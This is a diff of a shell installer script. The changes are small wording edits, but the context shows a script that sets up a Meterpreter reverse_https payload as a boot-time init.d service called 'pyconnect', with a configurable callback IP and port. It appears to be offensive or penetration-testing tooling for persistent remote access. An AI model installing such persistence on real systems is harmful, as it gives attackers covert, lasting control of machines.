@@ -27,7 +27,7 @@ printf "using the ${GRN}python/meterpreter/reverse_https ${NC}payload.\n\n"
 printf "${RED}This script will not validate your inputs! That's your job!\n\n${NC}"
 
 # Get and setup install path
-printf "Please enter a location to install the script. [Enter for /root]"
+printf "Please enter a location to install the script. [Enter for /root] "
 read choice
 
 if [ -z ${choice// } ]; then
@@ -146,11 +146,11 @@ cat << EOF > /etc/init.d/pyconnect
 
 case "$sub1" in
   start)
-    echo "Starting pyconnect service"
+    echo "pyconnect service started"
     $INSTALL_PATH/connect_worker &
     ;;
   stop)
-    echo "Stopping pyconnect service"
+    echo "pyconnect service stopped"
     killall connect_worker
     ;;
   *)
@@ -165,10 +165,10 @@ EOF
 chmod 0700 /etc/init.d/pyconnect
 printf "${STAT}Setting pyconnect to start at boot\n"
 update-rc.d pyconnect defaults
-printf "${STAT}Attempting to Start pyconnect\n\n"
+printf "${STAT}Attempting to start pyconnect\n\n"
 /etc/init.d/pyconnect start
 printf "\n${GRN}Done!${NC}\n\n"
-printf "${STAT}You can change the IP Address and Port by editing $INSTALL_PATH/connect_worker\n\n"
+printf "${STAT}You can change IP Address and Port by editing $INSTALL_PATH/connect_worker\n\n"
 
 
 
